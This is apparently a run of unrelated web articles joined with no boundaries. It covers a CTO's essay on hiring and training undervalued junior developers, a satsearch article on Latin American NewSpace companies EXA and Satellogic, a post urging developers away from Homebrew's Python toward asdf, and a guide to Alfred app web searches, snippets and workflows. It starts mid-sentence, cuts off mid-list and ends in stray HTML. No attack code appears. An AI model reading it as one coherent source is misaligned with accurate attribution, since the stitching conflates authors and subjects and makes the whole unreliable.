Instagram, all on the public cloud, <a href="https://www.dailymail.co.uk/news/article-2127343/Facebook-buys-Instagram-13-employees-share-100m-CEO-Kevin-Systrom-set-make-400m.html">sells to Facebook</a> for $1B with 13 employees in 2012; Bank of America <a href="https://newsroom.ibm.com/2019-11-06-IBM-Developing-Worlds-First-Financial-Services-Ready-Public-Cloud-Bank-of-America-Joins-as-First-Collaborator">makes its first announcement</a> to do anything with the public cloud in November of 2019. Kevin Systrom <a href="https://www.businessinsider.com/instagram-founder-kevin-systrom-has-no-formal-programming-training-2012-4">had only just learned to program</a> when he started Instagram; Bank of America’s technology organization is run by people who are decades from being practitioners. (Lest anyone try to argue Bank of America’s slowness is due to regulatory issues, <a href="https://get.acloudguru.com/capital-one-case-study">consider Capital One</a>).</p><h4 id="h-senior-developers-can-be-a-solution-in-search-of-a-problem">Senior developers can be a solution in search of a problem</h4><p>Another problem with senior-developer-only organizations is that <strong>most organizations don’t have constant flows of work that require lots of experience</strong>. A tremendous amount of software development is updating interfaces to add functionality or improve usability, not building back ends from scratch that have to scale to hundreds of millions of daily users.</p><p>And as we have better and more powerful <a href="https://www.infoq.com/articles/serverless-sea-change/">cloud services</a> to build on (e.g., AWS, GCP, Azure, Netlify, Twilio, Stripe), more developer focus turns to interfaces. Having an organization filled with senior developers who aren’t mentoring junior developers is asking to find senior-developer problems to solve, even if they’re best solved by an existing service.</p><h2 id="h-finding-undervalued-people">Finding Undervalued People</h2><p>Many developers are systemically undervalued because they do not fit central casting for appearance or mentality. Others are undervalued because organizations typically aren’t willing to hire software developers who need some training to do the job effectively.&nbsp;</p><p>Instead, whatever cargo-cult exercise an individual had to learn to become an interviewer (e.g., inverting binary trees on a whiteboard) tends to be viewed like a fraternity hazing ritual: “I had to go through it, so I’ll make everyone else after me go through it.”</p><p>There are excellent software developers who hate hackathons and would rather spend time raising their children on weekends than on coding side projects. There are people who are neuroatypical who can’t deal well with your unrealistic, on-the-spot brain teasers. There are people who need some additional training and mentorship to be able to ship software effectively for most organizations. These people are all undervalued by the standard hiring practices in tech, which means that, with some effort on your part, they’ll give the highest return on investment of any hires you can make.</p><h2 id="h-when-you-invest-in-people-people-invest-in-you">When you invest in people, people invest in you</h2><p>Over the past twenty years, I have seen a real difference between hiring software developers with the view of, “You’re a superstar and we need you to come in and kick ass” versus, “We will bring you in, teach you how we think and build, and then you’ll help us achieve our mission.”</p><p>The former attitude can lead to developers thinking they are better than other departments and other people in the organization, because no one else can do what they do. (After all, they are superstars!) The latter is fundamentally aligning to a mission and a team and a culture.</p><p>Remember, all software developers pick up bad habits. They usually don’t know all the latest best practices. They generally haven’t been given work time and space to experiment with new technologies. They won’t know all of your code or your stack or how your teams’ specific approaches to software development. These generalizations hold true for all developers, junior to senior.</p><p>You can choose to not invest any effort into training and aligning senior developers and still see things ship, but that doesn’t mean that you’re growing cohesive teams that are making the right decisions for your organization. You should invest in bringing everyone up to speed and together. When you do that, you realize that <strong>bringing junior developers onboard is not necessarily a greater effort than bringing senior developers onboard</strong>, especially if your criteria for success is successful, happy teams that are making the best decisions.</p><h2 id="h-how-to-build-undervalued-talent">How to build undervalued talent</h2><p>If you hire undervalued people and you train them to be successful for your organization, you will end up with teams that are more aligned and more loyal to your mission. The right way to do this is to onboard people in stages that end up with developers working on your codebase, as opposed to hiring everyone with the expectation that they’re working high-priority tickets on day one.</p><p>For example, at Branch, we have a multi-stage process where entry-level developers are initially granted a stipend to fund living expenses while taking online courses, working through sample exercises, and attending office hours for any questions. The end of the first stage is completing the Branch take-home developer hiring exercise that we have used to hire all developers.</p><p>The second stage is a paid internship that has the goal of learning how to work as part of the development team, but having the space to go slowly and ask lots of questions, and the expectation that there may be many PR revisions. We identify tickets in our backlog as “intern” work, so that there isn’t high pressure to complete anything in a short period of time.</p><p>This entire process does take time from the existing development staff, but it can be contained (mostly) into onboarding, office hours, code reviews, and weekly 1-on-1s. And it allows you to make hiring decisions that exclude bad cultural fits because you will find enough talent by investing in your workforce. You’ll create a massive competitive advantage over your competitors who are still stuck in their fraternity-hazing ruts.</p><h2 id="h-the-roi-of-building-talent">The ROI of building talent</h2><figure><div><blockquote data-width="500" data-dnt="true"><div lang="en" dir="ltr"><p>There is a delicious irony that so many venture-backed companies seek only to hire out of expensive four-year universities or people with experience working at other VC-backed startups, yet want their teams to be dedicated to the company's mission.</p><p>1/</p></div>— Joe Emison (@JoeEmison) <a href="https://twitter.com/JoeEmison/status/1343222725226209280?ref_src=twsrc%5Etfw">December 27, 2020</a></blockquote> </div></figure><p>Many venture-backed companies seek people dedicated to their missions, but then shoot themselves in the foot by only looking to hire people from “elite” schools or out of “name-brand” venture-backed companies. Those hiring pools are filled with people who are ready and able to job-hop to further themselves, and are often very weakly committed to company missions. In contrast, if a company invests in undervalued people who need some mentorship, training, and experience to reach their full potential, those people are much more likely to commit to the company and the mission with their full selves.</p><p><em>Joe Emison is the CTO of Branch Insurance, which provides home and auto insurance.

<p><em>This article on NewSpace in Latin America was developed in collaboration with the <a href="https://satsearch.co/suppliers/exa" target="_blank" rel="noreferrer noopener">Ecuadorian Space Agency (EXA)</a>, a participant in the <a href="https://satsearch.co/membership" target="_blank" rel="noreferrer noopener">satsearch membership program</a>.</em></p>



<p><em>It includes a discussion of Latin America’s position in the global industry along with a deeper case study investigation into two example companies from the region; <a href="https://satsearch.co/suppliers/exa" target="_blank" rel="noreferrer noopener">EXA</a> and <a href="https://satsearch.co/suppliers/satellogic" target="_blank" rel="noreferrer noopener">Satellogic</a>.</em></p>



<hr>



<p>In recent years the space economy has grown at a rapid rate. According to the <a href="https://www.spacefoundation.org/2019/03/18/space-foundation-2018-annual-report/" target="_blank" rel="noreferrer noopener">Space Foundation 2018 Annual Report</a>; in 2017 it totalled USD 383.5 billion worldwide and it is projected to keep growing.</p>



<p>In addition, the report highlights that during 2017 there was a 7% increase in orbital launch attempts around the world, a 100% increase in the total number of spacecraft deployed and a 200% increase in the number of commercial spacecraft deployed.</p>



<p>As this trend continues it is reminiscent of what transpired with the aviation industry around 50 years ago. After several years of heavy regulation and the sector being dominated by a few airlines, 1970s deregulation and lower costs resulted in a huge increase in competition. This brought in new carriers and routes, leading to an increase in passenger numbers that built the multibillion-dollar industry that connects the world today.</p>



<p>We’re see the same pattern unfold right in front of our eyes with the rapid privatization and commercialization of the space sector. A new age of space exploration is emerging; one that is no longer dominated by few countries with large and established space programs, but rather by a large group of private companies, startups and other entrepreneurs that are ready to take the next steps to push the boundaries of humanity while also benefiting and profiting from space. This is known as “<a href="https://blog.satsearch.co/2019-02-26-lets-talk-about-newspace" target="_blank" rel="noreferrer noopener">NewSpace</a>”.</p>



<hr>



<h2>Beyond the traditional powers</h2>



<p>NewSpace is opening the doors for other regions and countries, aside from the traditional dominant player of the United States of America, to take a leap of faith and start shaping the future of space exploration.</p>



<p>These nations now have the potential to become a driving force, innovate, and act, or else they risk the chance of missing out on the financial and social benefits that the NewSpace sector provides.</p>



<p>This is particularly true for the Latin American region where space exploration has always been thought of as something of a luxurious enterprise. For a region comprised mainly of emerging economies, government run and financed space agencies have always been a difficult option, as funds and resources are primarily allocated to priorities such as healthcare and education.</p>



<p>Although these priorities are perfectly valid of course, not taking part in the NewSpace industry does further the position of Latin America as an ‘underdeveloped’ region. Privatization and commercialization of space technologies in the growing, connected global market is therefore key for other private and civilian enterprises, to take the burden off the government and immerse their respective countries in the NewSpace era.</p>



<p>A strengths, weaknesses, opportunities and threats (SWOT) analysis on greater participation in the NewSpace industry in Latin America was performed in order to better characterize the prospects for the region, considering the historical, industrial, and political realities that it faces. This analysis also sets a roadmap for NewSpace integration of new actors, indicating where they can optimize their efforts and where they should be careful.</p>

<h2>Companies active in NewSpace in Latin America</h2>



<p>Two entities, <a href="https://satsearch.co/suppliers/exa" target="_blank" rel="noreferrer noopener">EXA</a> and <a href="https://satsearch.co/suppliers/satellogic" target="_blank" rel="noreferrer noopener">Satellogic</a>, have emerged as leaders in the region, proving that even for companies coming from developing countries, it is possible to be part of the global space market. These companies are an effective case study showing that achieving NewSpace integration in the region is possible.</p>



<p>The <a href="https://satsearch.co/suppliers/exa" target="_blank" rel="noreferrer noopener">Ecuadorian Civilian Space Agency (EXA)</a> is a not-for-profit, non-governmental institution that follows a civilian space exploration model. It has become established as Ecuador’s first space agency and is tasked with executing the nation’s space program.</p>



<p><a href="https://satsearch.co/suppliers/satellogic" target="_blank" rel="noreferrer noopener">Satellogic</a> is based in Argentina and is the first vertically integrated geospatial analytics company in the country.</p>



<p>Both EXA and Satellogic were responsible for the conception, design, and manufacturing of their first and second national CubeSats; NEE-01 PEGASO and NEE-02 KRYSAOR for Ecuador, and CubeBug-1 and CubeBug-2 for Argentina. These satellites served as effective technology demonstrators that now drive the commercialization of proprietary technologies in the case of EXA, and the provision of Earth Observation and analytics services in the case of <a href="https://satsearch.co/suppliers/satellogic" target="_blank" rel="noreferrer noopener">Satellogic</a>.</p>



<p>The sections below include more information on each of these businesses.</p>



<hr>



<h2>EXA – helping Ecuador join the list of countries with space programs</h2>



<p>As a research and development institution <a href="https://satsearch.co/suppliers/exa" target="_blank" rel="noreferrer noopener">EXA</a> has trusted <a href="http://www.cubesat.market/" target="_blank" rel="noreferrer noopener">CubeSat.Market</a>, a commercial space company, with the promotion, marketing, and commercialization of its space products.</p>



<p>These products range from power systems to all-in-one EPS, OBC, and SDR systems. <a href="https://satsearch.co/suppliers/exa/products" target="_blank" rel="noreferrer noopener">Find out more about this portfolio here</a>.</p>



<div><figure><a href="https://satsearch.co/suppliers/exa/products" target="_blank" rel="noopener"><img loading="lazy" width="683" height="582" src="https://blog-admin.satsearch.com/wp-content/uploads/210203_satsearch_exa_product_portfolio.png" alt="" srcset="https://blog-admin.satsearch.com/wp-content/uploads/210203_satsearch_exa_product_portfolio.png 683w, https://blog-admin.satsearch.com/wp-content/uploads/210203_satsearch_exa_product_portfolio-300x256.png 300w" sizes="(max-width: 683px) 100vw, 683px"></a></figure></div>







<p>EXA´s products have been chosen by several regional and international partners to fly in different missions to Earth’s orbit, to the moon and beyond.</p>



<p>One of these clients is <a href="https://www.irvinecubesat.org/" target="_blank" rel="noreferrer noopener">the Irvine Cubesat STEM Program</a> which is developing a fleet of 12 satellites with <a href="https://satsearch.co/suppliers/exa" target="_blank" rel="noreferrer noopener">EXA</a> as its primary supplier. Another client is the <a href="https://www.unam.mx/" target="_blank" rel="noreferrer noopener">Universidad Nacional Autónoma de México (UNAM)</a> that is developing its very own K´OTO spacecraft with the EXA spacecraft bus at its core.</p>



<p>In addition, EXA has developed a <a href="https://blog.satsearch.co/2020-01-22-optical-communications-for-small-satellites-and-cubesats-product-roundup" target="_blank" rel="noreferrer noopener">laser communication module for CubeSats</a> capable of transmitting up to 100 mbps at a maximum power of 25 Watts. This module is looking to transform how communication is performed from space to ground and in-orbit, particularly between satellites in a constellation.</p>



<p>EXA is an excellent case study into how a Latin American country such as Ecuador can lead by example, producing commercial technology for the global space market while bringing the whole region along into NewSpace.</p>

<h2>Satellogic – global growth from Argentina</h2>



<p><a href="https://satsearch.co/suppliers/satellogic" target="_blank" rel="noreferrer noopener">Satellogic</a> has grown into a multinational company with offices and clients all over the world. They are currently building a 60-satellite constellation that will be able to remap the entire planet each week, providing customers with high-resolution images and processed analytics that will allow for daily decision-making support.</p>



<p>This constellation is made possible due to the creation of the NewSat microsatellite, a small, light, and inexpensive platform that carries both a sub-meter resolution multispectral imaging instrument and a 25-meter resolution hyperspectral camera.</p>



<p>Since 2016 <a href="https://satsearch.co/suppliers/satellogic" target="_blank" rel="noreferrer noopener">Satellogic</a> has launched 18 NewSats, with significant improvements generation to generation, totalling 21 spacecraft in orbit to date. Satellogic has also been recognized for innovative space business solutions with its dedicated satellite constellations and AI-based geospatial analytics services.</p>



<p>These achievements make <a href="https://satsearch.co/suppliers/satellogic" target="_blank" rel="noreferrer noopener">Satellogic</a> an excellent example of how ideas and services originating from Argentina and Latin America are capable of revolutionizing how we think about space.</p>

<h2>The future of NewSpace in Latin America</h2>



<p>In August 2020 the <a href="https://iaaspace.org/" target="_blank" rel="noreferrer noopener">International Academy of Astronautics (IAA)</a> conducted <a href="https://iaaspace.org/event/4th-iaa-latin-american-cubesat-workshop-2020/" target="_blank" rel="noreferrer noopener">the 4th IAA Latin American Cubesat Workshop</a> in which, on its last day, it organized a CubeSat Industry session. In this session many Latin American companies, and startups, including Satellogic and EXA, through Cubesat.Market, showcased products and services paving the way for integration of others in the region into NewSpace.</p>



<p>Some of the presenters included the University of Chile, EMSISTI, ISI-SE Senai, Orbital, CRON, Fibraforte, HORUSEYE, and Opto S&amp;D. These companies, ranging from new small startups to large established firms, are creating satellite systems for many different applications, from attitude and determination actuators for CubeSats to <a href="https://blog.satsearch.co/2020-04-03-smallsat-and-cubesat-solar-panels-on-the-global-market" target="_blank" rel="noreferrer noopener">solar panels</a>, and fuel and oxidizer tanks for large spacecraft.</p>



<p>This session showed the wide availability of space innovation in the region and inspired the possibility of future collaboration, and larger regional projects.</p>



<p>Latin America may be historically constrained as an underdeveloped region in global terms, but these case studies show that a few private institutions are leading the way, setting an example of what is possible, expanding the state-of-the-art, proposing innovative business models and not just joining the NewSpace era, but also becoming a driving force for how it is going to continue to develop in the future.</p>



<p>These companies hope to show that it is possible for Latin American space companies to achieve such success, all while bringing the financial and social benefits of space for all its people. </p>

            <p>Don’t use Homebrew Python. It’s not meant for&nbsp;you.</p>
<p>At some point Homebrew made changes that adversely affect Python development. While Homebrew’s Python formula has been the go-to choice for Python developers (including me) for a long time, that time is past — there are now <em>much</em> better options&nbsp;available.</p>
<h2 id="whats-the-problem">What’s the&nbsp;Problem?</h2>
<p>Perhaps you heard stories about why you shouldn’t use the system-bundled Python<sup id="fnref:1"><a href="#fn:1" title="I’ve talked about some macOS-specific reasons to eschew its bundled Python, but Ubuntu/Debian is also affected.">1</a></sup>, so instead you use Homebrew to install Python and then use its interpreter to create a virtual environment. A month later, you activate that same environment, and when you try to use it, you see this inscrutable&nbsp;error:</p>
<div><pre><span></span><code><span>dyld</span><span>:</span> <span>Library</span> <span>not</span> <span>loaded</span><span>:</span> <span>@</span><span>executable_path</span><span>/../</span><span>.</span><span>Python</span>
<span>Referenced</span> <span>from</span><span>:</span> <span>/your/home/.virtualenvs/your-env-name/bin/</span><span>python</span>
<span>Reason</span><span>:</span> <span>image</span> <span>not</span> <span>found</span>
</code></pre></div>

<p>What happened? The Python interpreter referenced by the virtual environment… no longer exists. But how can that be? You didn’t change&nbsp;anything!</p>
<p><em>You</em> didn’t change anything… but Homebrew did. Of the adverse changes Homebrew made recently, two stand out as root causes of this&nbsp;problem.</p>
<p>First, Homebrew now upgrades dependent packages automatically. So if you upgrade <em>any</em> package that depends on the <code>python</code> formula<sup id="fnref:2"><a href="#fn:2" title="You can see which of your installed formulae depend on the python formula by running: brew uses python --installed … I have over 30 Python-dependent formulae installed on my workstation.">2</a></sup> (and there are nearly <strong>400</strong> of them), then your Python interpreter will be upgraded also — whether you like it or not. You have no control over&nbsp;this.</p>
<p>Second, Homebrew now automatically deletes previous versions every 30 days, including of course any Python interpreters you used to create virtual&nbsp;environments.</p>
<p>The havoc wrought by the combination of these two changes is considerable. Those Python virtual environments you created over the last year? All of them are now broken. Why? Just because you ran <code>brew upgrade ponysay</code>? Yup.<sup id="fnref:3"><a href="#fn:3" title="Previously, you had to manually run brew cleanup to get yourself into this mess. Now the carnage happens automatically. Any time a new Python version is released, even patch releases such as from 3.8.6 to 3.8.7, there is the very real potential that any virtual environment that depends on the previous Python version will just break horribly and without any warning. And it’s not just your virtual environments — any software that depends on Python can have the carpet yanked out from under it, including Pipx, YouCompleteMe, and other components that you may not even realize depend on the presence of a stable Python foundation. Moreover, this problem isn’t even confined to Python. Need a specific version of Node.js to build static assets for your web application? Have an old Rails app that needs a previous Ruby version? Under the Homebrew regime, those can also be swept away at any&nbsp;time.">3</a></sup></p>
<h2 id="homebrew-python-is-not-for-you">Homebrew Python Is Not For&nbsp;You</h2>
<p>The web is littered with frustrated reports about this problem and replete with hacked-together Bash scripts that purport to repair damaged Python virtual environments. And all because of one core&nbsp;misunderstanding.</p>
<p>Homebrew’s Python is not for you. It exists to serve Homebrew, or more accurately, Homebrew’s other formulae. The primary purpose of Homebrew’s Python formula is to enable other Python-dependent Homebrew packages to work. If installing Homebrew’s Python allows you to run the occasional Python script or access the <abbr title="read-eval-print loop"><span>REPL</span></abbr><sup id="fnref:4"><a href="#fn:4" title="Assuming you’re okay with bundled Python caveats, there’s no reason to install Homebrew just for Python, since macOS includes Python 3 in its command-line tools (CLT) package.">4</a></sup>, that’s a nice side benefit, but anything beyond that — including developing software with Python — is squarely&nbsp;out-of-scope.</p>
<p>Once you come to this realization, it should be clear that this is the wrong tool for the job. So what is the right&nbsp;tool?</p>

<p>There are several solutions that put <strong>you</strong> back in control of when Python versions are installed, upgraded, and removed. Personally, I use <a href="https://asdf-vm.com/">asdf</a> and its <a href="https://github.com/danhper/asdf-python">Python plugin</a> to do <a href="https://hackercodex.com/guide/python-development-environment-on-mac-osx/">just that</a>. I prefer <a href="https://asdf-vm.com/">asdf</a> to similar tools such as Pyenv and Pythonz because not only can you install multiple Python versions but also multiple Node.js versions, Ruby versions, and <a href="https://asdf-vm.com/#/plugins-all?id=plugin-list">many more</a>.</p>
<p>After switching to this solution, would you like to guess how many times I’ve had something break due to a Python upgrade? Right: <em>Zero</em>. Zero times. Because <strong>I</strong> am now in control of when older Python versions are swept away, I can upgrade virtual environments at my leisure, and then, once I’ve confirmed no other environments rely on older versions, I can then uninstall those old Python versions without worrying about something&nbsp;breaking.</p>
<h2 id="epilogue">Epilogue</h2>
<p>There are hack workarounds, and I’ve tried them. None of them fix the core&nbsp;problem.</p>
<p>For example, the automatic monthly clean-up can be disabled by defining a <code>HOMEBREW_NO_INSTALL_CLEANUP</code> environment variable and setting it to “1”. But all it takes is one accidental <code>brew</code> invocation in a shell session where that variable is not set, and your environments are laid to waste. Plus, even if you avoid that footgun, there is no easy way to remove specific old versions that you may no longer need; you have no choice but to <code>rm -rf</code> directories in <code>/usr/local/Cellar/</code> and hope you don’t break&nbsp;anything.</p>
<p>I also tried to avoid installing Homebrew Python entirely, with the idea that since I’m not using it anymore, I don’t need it to be installed. But assuming you use Homebrew to install other tools, that would be a fool’s errand — Homebrew Python will almost certainly be installed anyway when some other formula requires it. But that doesn’t mean we have to use it! Let the Homebrewed Python sit there and do its job serving other formulae, and we can forget it&nbsp;exists.</p>

            <p><a rel="noopener noreferrer" target="_blank" href="https://www.alfredapp.com/">Alfred</a> is my favourite piece of software on the Mac. It's fast. It's reliable. It's unobtrusive.</p>
<p>I've been using it since I started working on macOS in 2013. In this post I would like to show you how I use it, my custom workflows and some tips and tricks. (Note: You find links to used themes and wallpapers at <a href="#themes-and-wallpapers">the end</a> of this article).</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/80738e5e7573f3a72bfec04efb7b74500b8526fa/08b15/assets/images/posts/20210130-my-alfred-setup/alfred-themes.jpg" alt=""></p><h2>What is Alfred?</h2>
<p>macOS ships with <a rel="noopener noreferrer" target="_blank" href="https://en.wikipedia.org/wiki/Spotlight_(software)">Spotlight</a>. A system wide search. In Yosemite, Apple redesigned the UI and Spotlight got a lot smarter. (You can do calculations or webs searches too).</p>
<p>Alfred is Spotlight on steroids. It uses Spotlight's search index to search files on your Mac, can start any of your installed apps and you can extend Alfred with custom workflows. The worfklow features become available when you upgrade and buy the "Powerpack".</p>
<p>With the basic summary out of the way, let's get started by replacing Spotlight with Alfred.</p>
<h2>Use Spotlight Keyboard Shortcut for Alfred</h2>
<p>The first I thing I do, when installing Alfred on a Mac, is disabling the default keyboard shortcut for Spotlight (<code>⌘+Space</code>) and use it for Alfred.</p>
<p>To do that, open <code>System Preferences → Keyboard → Shortcuts</code>. Click on  "Spotlight" and disable "Show Spotlight search".</p>
<figure>

  <figcaption>Disable the "Show Spotlight search" setting to free up the `⌘+Space` keyboard shortcut</figcaption>
</figure>
<p>Open the Alfred settings and use the freed up <code>⌘+Space</code>-combination to launch Alfred.</p>

  <figcaption>Update the keyboard shortcut to invoke Alfred to `⌘+Space`.</figcaption>
</figure>
<h2>Custom Web Searches</h2>
<p>Web searches are the first powerful feature we take a closer look at. I use them everyday at work; but not necessarily to search. Let me explain:</p>
<p>In summary, a custom web search allows you to set up a shortcut to start a search on any website. It just passes the given search term to a URL. For example <code>app Tony Stark</code> expands to <code>https://example.com/search?q=Tony Stark</code>. So far, so good.</p>
<p>The way I use "web searches" in Alfred, is that my input is ususally an ID for a resource in one of my most used applications and not necessarily as a search term. Here are a few examples:</p>
<ul>
<li>Open the customer details page in our app. <code>app:customer 123</code> expands to <code>https://example.com/admin/customers/123/</code>.</li>
<li>Open the invoice details page in our app. <code>app:invoice 123</code> would expand to <code>https://example.com/admin/invoices/123</code>. ("invoice" is a generic example and you can adapt this to any other "thing" you use at your job (posts, sale, product, …))</li>
<li>Open a JIRA ticket. <code>jira PROJ-123</code> expands to <code>https://jira.example.com/browse/PROJ-123</code>.</li>
<li>Quickly open a personal GitHub repository by typing <code>ghm repo_name</code>. The search url looks like this: <code>https://github.com/your-username/{query}</code>
</li>
</ul>
<p>Of course I also use it as a regular search too.Here are a few examples I use regularly. (Click "Import" to import the custom web search)</p>
<ul>
<li>Search <a rel="noopener noreferrer" target="_blank" href="https://developers.mozilla.org/">MDN Web Docs</a>. <code>mdn querySelectorAll</code>. <a rel="noopener noreferrer" target="_blank" href="alfred://customsearch/Search%20MDN%20for%20%7Bquery%7D/mdn/utf8/nospace/https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fsearch%3Fq%3D%7Bquery%7D">Import</a>
</li>
<li>Search <a rel="noopener noreferrer" target="_blank" href="https://caniuse.com/">caniuse.com</a>. <code>can flexbox</code>. <a rel="noopener noreferrer" target="_blank" href="alfred://customsearch/Can%20I%20Use%20X%20in%20browser%20Y/can/utf8/nospace/https%3A%2F%2Fcaniuse.com%2F%23search%3D%7Bquery%7D">Import</a>
</li>
<li>Search <a rel="noopener noreferrer" target="_blank" href="https://caniemail.com/">caniemail.com</a>. <code>canemail grid</code>. <a rel="noopener noreferrer" target="_blank" href="alfred://customsearch/Search%20caniemail.com%20for%20%7Bquery%7D/canemail/utf8/nospace/https%3A%2F%2Fwww.caniemail.com%2Fsearch%2F%3Fs%3D%7Bquery%7D">Import</a>
</li>
</ul>
<p>I also have custom searches for different ecommerce sites I regularly visit. I can type <code>groceries Toiletpaper</code> and land on the search page of the desired online shop.</p>
<p>But I think you get the gist: The sky is the limit!<br>
If you regularly go to a website and search for something or need to look up a "details page", consider creating a custom web search for it.</p>
<h2>Clipboard History</h2>
<p>Copy and pasting is something I do everyday. Be it code, files, URLs, IDs or just text. Alfred ships with a clipboard manager, which allows you to paste previously copied text into your editor or email draft.</p>
<p>The best thing about it? It also supports images and file lists! What does this mean?
Instead of just keeping track of copied text, Alfred also stores copied files and images in a buffer. You can then browse this buffer and paste text and images in any order you like.</p>
<figure>
    <video loading="lazy" controls="" loop="" muted="">
        <source src="https://d33wubrfki0l68.cloudfront.net/34c453b619069d7ad30a7dd46befb07b0acafe4a/0aa63/assets/images/posts/20210130-my-alfred-setup/alfred_history_compressed.mp4" type="video/mp4">
    </video>
    <figcaption>This video shows, how I can copy multiple items into the clipboard history and retrieve them in different orders.</figcaption>
</figure>
<p>I've remapped the shortcut to open the Clipboard History to <code>⇧+⌘+C</code>. It's a bit more logical to me.</p>
<p>The clipboard history is something that takes some time to get used to. The first few days or weeks you forget, that it exists. But once you've understood it, are compfortable with it and know that it's available to you in every app, you don't wan't to miss it.</p>
<h2>Snippets</h2>
<p>Yet another powerful tool hidden behind "Features" in Alfreds settings are Snippets. As the name might suggest, in snippets you can store often used text snippets. Be it canned email responses, fake credit card numbers to test your Stripe integration, Emojis or Mac Symols like <code>⌘</code> or <code>⌅</code>.</p>
<p>I've updated the keyword to open the snippet search to be￼ <code>s</code>. To paste the character <code>→</code> into a document for example, I then only have to type <code>s right</code>, select the right snippet and hit enter.</p>
<h3>Markdown Fences</h3>
<p>My most used snippets do not paste readable text into the currently focused editor, but rather a set of characters. Backticks or "Markdown fences" to be exact.</p>
<p>For 20 years now, I've used keyboards with the Swiss-German layout. To denote a word or phrase as code in Markdown, you have to enclose it in backticks (`). On the Swiss-German keyboard layout you have to hit a weird combination which gets quite annoying if you have to type it a hundred times a day. I also quickly fall out of my writing flow.<br>
So I've written 2 snippets to fix that.</p>
<p>First there is the "inline Markdown code" snippet, invoked by typing <code>imdc</code>. As the name suggests it's for highlighting code inline in a sentence (Like you've seen it scattered in the article you're reading right know).
For multi-line code examples I've created a "Markdown code" snippet, invoked by typing <code>mdc</code>.</p>
<figure>
    <video loading="lazy" controls="" loop="" muted="">
        <source src="https://d33wubrfki0l68.cloudfront.net/76011772d3b86b476840af5301be7c2ccb89f1b5/a2e5d/assets/images/posts/20210130-my-alfred-setup/alfred_markdown.mp4" type="video/mp4">
    </video>
    <figcaption>By using a snippet to create Markdown code fences, I can easly type my code examples without breaking my writing flow.</figcaption>
</figure>
<p>The best thing is, that you can use the <code>{cursor}</code> variable to automatially move the cursor between the two backticks.</p>
<p>Here's is the content of those two Markdown snippets:</p>
<pre><code># Inline Markdown Code
`{$cursor}`
</code></pre>
<pre><code># Markdown Code
```
{$cursor}
```
</code></pre>
<h3>Emojis</h3>
<p>My biggest snippet collection is centered around emojis. Wether you love them or hate them, sometimes you use them.</p>
<p>Joel Califa once created an <a rel="noopener noreferrer" target="_blank" href="http://joelcalifa.com/blog/alfred-emoji-snippet-pack/">"Emoji Snippet Pack"</a>. This collection of snippets allows you to type <code>:v:</code> to get the ✌️ emoji.
Since Joel released his pack, new emojis have been released, and I stepped up and created a build process to his open-sourced emoji pack (<a rel="noopener noreferrer" target="_blank" href="https://github.com/califa/alfred-emoji-pack/pull/1">see PR #1</a>).<br>
However, my added build process relies on dependencies which very slowly update to newly released emojis (which is okay, as these dependencies are used for something different than a snippet pack).</p>
<p>That's why I've created my own project. You can find it <a rel="noopener noreferrer" target="_blank" href="https://github.com/stefanzweifel/alfred-emoji-pack">on GitHub</a>.<br>
Currently it's the same as the one from Joel, but written in PHP. The goal is, to switch the source for the emojis to the official list of available characters from unicode.org.<br>
A plus would then be to also create a new release when new emojis are being released by using GitHub Actions.
I will work on that project over the next couple of weeks.</p>
<p>Here's a quick video on how I use the emoji snippets.</p>
<figure>
    <video loading="lazy" controls="" loop="" muted="">
        <source src="https://d33wubrfki0l68.cloudfront.net/b5f4c753aa822532c8192cd048d5e90770761269/459cd/assets/images/posts/20210130-my-alfred-setup/alfred_emoji.mp4" type="video/mp4">
    </video>
    <figcaption>By having all emojis available as snippets, I can type them out or search them in my snippets library. No need to scroll though Apple's emoji picker.</figcaption>
</figure>
<h3>Miscellaneous Snippets</h3>
<p>I also have snippets which actually contain text:</p>
<ul>
<li>Canned responses to support emails or unsolicited recruiter emails,</li>
<li>Templates for certain types of notes I take</li>
<li>Code snippets I regularly use</li>
<li>Shortcuts for CLI actions (like ziping a folder on UNIX as I will never remember the options for <code>tar</code> 😅)</li>
</ul>
<h2>Workflows</h2>
<p>Next let's cover the most famous and powerful feature of Alfred: Workflows.</p>
<p>Workflows allow you to write basic programs with a drag and drop editor. You define the event that triggers the workflow (a hotkey, a snippet, a file action), define its input (keyword, file filter) and then take action it (open a file, run a search or run a script).</p>
<p>They can wary between very simple and very complex. For example "search <em>this</em> folder for <em>that</em> file type and open the file in <em>that</em> app" is quite easy to accomplish. "Search and play Spotify playlists" however is quite complex and needs a lot of scripting work.</p>
<p>So first I would like to show you some of my own workflows. They are quite simple but save me a couple of seconds every day.</p>
<h3>Open Common Folders</h3>
<p>Eventhough Alfred comes with a backed in file browser, I often still use good old Finder.app. To get access to my most used folders quickly, I've created workflows which just open that folder:</p>
<ul>
<li>
<code>downloads</code> opens <code>~/Downloads</code>
</li>
<li>
<code>desktop</code> opens <code>~/Desktop</code>
</li>
<li>
<code>sites</code> opens <code>~/Sites</code> (where all my code projects live)</li>
<li>
<code>inbox</code> opens my <a href="https://stefanzweifel.io/posts/2020/08/04/synology-nas-setup-2020/#folder-structure--synology-drive">File Inbox</a>
</li>
</ul>

  <figcaption>The "Common Folders" workflow is simple but effective for navigating to most used folders quickly.</figcaption>
</figure>
<p>Workflows like these might look silly at first. But once you realize how much time you spend browsing Finder – by mouse or keyboard – you might change your mind.</p>
<h3>File Filter Workflows</h3>
<p>Not used that much anymore but still handy, is my collection of file filters. I've created several workflows to search for files with a certain extension or just folders in a directory and pass that file to an application.</p>

</figure>
<p>For example, I can type <code>phps laravel-stats</code> to open <a rel="noopener noreferrer" target="_blank" href="https://github.com/stefanzweifel/laravel-stats">laravel-stats</a> in <a rel="noopener noreferrer" target="_blank" href="https://www.jetbrains.com/phpstorm/">PhpStorm</a>.</p>
<p>Or I can type <code>unzip backup</code> and Alfred will search for <code>.zip</code> files which have "backup" in their name. Selecting the zip file will open it in <a rel="noopener noreferrer" target="_blank" href="https://apps.apple.com/ch/app/the-unarchiver/id425424353?l=en&amp;mt=12">The Unarchiver</a>.</p>

<p>Here's a quick tutorial on how to set this up yourself:</p>
<ol>
<li>Create a new blank workflow</li>
<li>Add a new "File Filter" input</li>
<li>Set a keyword, title and subtext that matches what you want to do.</li>
<li>Drag the file types you want to search for into the "File Types" box. For example, if you want to search for Markdown files, drag a <code>.md</code>-file into it.</li>
<li>Then create and connect a "Open File" Action with your File Filter.</li>

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
